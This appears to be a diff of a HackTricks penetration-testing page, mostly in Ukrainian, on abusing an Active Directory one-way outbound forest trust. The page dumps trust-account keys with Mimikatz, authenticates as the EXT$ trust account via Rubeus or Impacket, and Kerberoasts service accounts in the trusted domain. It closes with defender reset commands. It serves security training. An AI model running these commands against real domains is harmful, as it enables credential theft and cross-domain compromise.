@@ -1,12 +1,12 @@
-# Зовнішній ліс домену - односторонній (вихідний)
+# External Forest Domain - One-Way (Outbound)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-У цьому сценарії **ваш домен** **довіряє** деяким **привілеям** принципалу з **інших доменів**.
+У цьому сценарії **ваш домен** **довіряє** певні **привілеї** principals з **іншого домену/лісу**.
 
-## Перерахування
+## Enumeration
 
-### Вихідна довіра
+### Outbound Trust
 ```bash
 # Notice Outbound trust
 Get-DomainTrust
@@ -28,46 +28,101 @@ MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
 MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
 ## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
 ```
+Якщо у вас є доступний AD module, також безпосередньо перегляньте **Trusted Domain Object (TDO)**. Це дає вам сирі trust data на основі LDAP, які пізніше знадобляться, коли ви вирішуватимете, чи простіший шлях — це **FSP/group abuse** або **trust-account abuse**:
+```powershell
+# Enumerate the TDO created for the foreign forest/domain
+Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
+Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged
+
+# Fast trust hygiene check from the outbound side
+Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
+```
+Також слід перерахувати, де foreign principals із `CN=ForeignSecurityPrincipals` фактично отримали доступ. Типові варіанти:
+
+- **Local admin** на сервері/DC у вашому поточному домені
+- Членство в **custom domain group**, яка має ACLs над users/computers/GPOs
+- Права на зміну **computer objects**, що згодом може стати [RBCD](resource-based-constrained-delegation.md), якщо конфігурація trust це дозволяє
+
 ## Trust Account Attack
 
-Вразливість безпеки існує, коли встановлюється довірчі відносини між двома доменами, які тут позначені як домен **A** та домен **B**, де домен **B** розширює свою довіру до домену **A**. У цій конфігурації спеціальний обліковий запис створюється в домені **A** для домену **B**, який відіграє важливу роль у процесі аутентифікації між двома доменами. Цей обліковий запис, пов'язаний з доменом **B**, використовується для шифрування квитків для доступу до сервісів між доменами.
+Коли one-way trust створюється з domain/forest **B** до domain/forest **A** (**B trusts A**), у **A** створюється **trust account** для **B**. У outbound-trust view **A** це корисно, тому що якщо згодом ви скомпрометуєте **B** (the trusting side), ви можете витягнути там trust secret і автентифікуватися назад до **A** як `B$`.
 
-Критичний аспект, який потрібно зрозуміти тут, полягає в тому, що пароль і хеш цього спеціального облікового запису можуть бути витягнуті з контролера домену в домені **A** за допомогою інструменту командного рядка. Команда для виконання цієї дії:
+Ключовий аспект тут полягає в тому, що пароль і Kerberos material для цього trust account можна витягнути з Domain Controller у **trusting** домені за допомогою:
 ```bash
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
-Ця екстракція можлива, оскільки обліковий запис, позначений знаком **$** після його імені, активний і належить до групи "Domain Users" домену **A**, тим самим успадковуючи дозволи, пов'язані з цією групою. Це дозволяє особам аутентифікуватися в домені **A** за допомогою облікових даних цього облікового запису.
+Це працює тому, що обліковий запис довіри, створений у **trusted** domain, є увімкненим principal, який отримує базові права звичайного domain user там. Цього часто достатньо, щоб почати enumerating LDAP, request tickets і знайти наступний шлях підвищення привілеїв.
 
-**Увага:** Можливо використати цю ситуацію, щоб отримати доступ до домену **A** як користувач, хоча з обмеженими правами. Однак, цей доступ є достатнім для проведення перерахунку в домені **A**.
-
-У сценарії, де `ext.local` є довірчим доменом, а `root.local` є довіреним доменом, обліковий запис користувача з ім'ям `EXT$` буде створено в `root.local`. За допомогою специфічних інструментів можливо скинути ключі довіри Kerberos, розкриваючи облікові дані `EXT$` у `root.local`. Команда для досягнення цього виглядає так:
+У сценарії, де `ext.local` є **trusting** domain, а `root.local` є **trusted** domain, обліковий запис користувача з ім’ям `EXT$` створюється всередині `root.local`. Dumping trust keys з `ext.local` виявляє credentials, які можна використати як `root.local\EXT$` проти `root.local`:
 ```bash
 lsadump::trust /patch
 ```
-Наступним кроком можна використовувати витягнутий ключ RC4 для автентифікації як `root.local\EXT$` в `root.local`, використовуючи команду іншого інструмента:
+Після цього використайте витягнутий ключ **RC4**, щоб автентифікуватися як `root.local\EXT$` всередині `root.local`:
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
 ```
-Цей крок аутентифікації відкриває можливість перераховувати та навіть експлуатувати сервіси в `root.local`, такі як виконання атаки Kerberoast для витягнення облікових даних облікового запису служби за допомогою:
+Тоді перелічи trusted domain як той principal, наприклад, через Kerberoasting високовартісного SPN у `root.local`:
 ```bash
 .\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
 ```
-### Збір пароля довіри в чистому вигляді
+### З Linux
 
-У попередньому потоці використовувався хеш довіри замість **пароля в чистому вигляді** (який також був **вивантажений за допомогою mimikatz**).
+Якщо ви відновили ключ облікового запису довіри **RC4**, та сама ідея працює з Linux через Impacket:
+```bash
+python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
+export KRB5CCNAME=EXT\$.ccache
 
-Пароль в чистому вигляді можна отримати, перетворивши вихід \[ CLEAR ] з mimikatz з шістнадцяткового формату та видаливши нульові байти ‘\x00’:
+# Kerberoast from the trusted domain as the trust account
+GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast
 
-![](<../../images/image (938).png>)
+# Or reduce noise and request only one user
+GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
+```
+Якщо **RC4** не приймається, перейдіть на відновлений **cleartext password** (або похідні ключі **AES**) і повторно використайте звичайні робочі процеси [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) та [Kerberoast](kerberoast.md) з цього foothold.
 
-Іноді при створенні відносин довіри користувачеві потрібно ввести пароль для довіри. У цій демонстрації ключем є оригінальний пароль довіри, тому він читається людиною. Оскільки ключ змінюється (кожні 30 днів), пароль в чистому вигляді не буде читатися людиною, але технічно все ще буде використовуваним.
+### Key material gotchas
 
-Пароль в чистому вигляді можна використовувати для виконання звичайної аутентифікації як обліковий запис довіри, альтернативою запиту TGT за допомогою секретного ключа Kerberos облікового запису довіри. Тут запитуємо root.local з ext.local для членів Domain Admins:
+Не плутайте **trust keys** і **trust-account credentials**:
 
-![](<../../images/image (792).png>)
+- У one-way trust обидві сторони зберігають **TDO**, але фактичний обліковий запис **`EXT$` user account існує лише в trusted domain**.
+- Поточний пароль trust-account відображається в TDO trust secret (`NewPassword` / current trust key).
+- **RC4** trust key — найпростіший артефакт для повторного використання в `asktgt` як trust account; у стандартних конфігураціях це зазвичай робочий enctype, бо в trust account часто порожній `msDS-SupportedEncryptionTypes`.
+- Якщо ви мислите в термінах **AES trust keys**, пам’ятайте, що вони не взаємозамінні з AES keys trust-account, бо salts відрізняються.
 
+Отже, для technique на цій сторінці краще використовувати або витягнутий **RC4** material, або відновлений **cleartext** password.
+
+### Gathering cleartext trust password
+
+У попередньому flow використовувався trust hash замість **cleartext password** (його також **dumped by mimikatz**).
+
+Cleartext password можна отримати, перетворивши вміст \[ CLEAR ] з mimikatz із hexadecimal і видаливши null bytes `\x00`:
+
+![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)
+
+Іноді під час створення trust relationship користувач має вручну ввести password для trust. У цій демонстрації key — це початковий trust password, тому його можна прочитати людиною. Коли key ротуються (default: кожні 30 days), cleartext зазвичай перестає бути читабельним, але все ще технічно придатний до використання.
+
+Cleartext password можна використати для звичайної authentication як trust account, як альтернативу запиту TGT за допомогою Kerberos secret key trust account. Тут виконується запит `root.local` з `ext.local` для members of `Domain Admins`:
+
+![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)
+
+### Practical limitations
+
+> [!WARNING]
+> Trust accounts — незручні principals. Interactive logons, такі як **RUNAS / console / RDP**, тут не є очікуваним шляхом, а спроби **NTLM** authentication можуть завершуватися з `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Плануйте **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) замість цього.
+
+### Persistence / cleanup note
+
+Якщо defenders зрозуміють, що trusting domain було compromised, вони мають ротувати trust secret на **both sides** за допомогою `netdom trust ... /resetOneSide ...`. З точки зору operator це важливо, бо **manual reset негайно invalidates old trust material**, тоді як звичайна rotation trust-password зберігає current/previous values під час rollover.
+```bash
+# Run once from the trusted side
+netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
+
+# Run once from the trusting side
+netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
+```
 ## Посилання
 
-- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
+- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
+- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)
 
 {{#include ../../banners/hacktricks-training.md}}
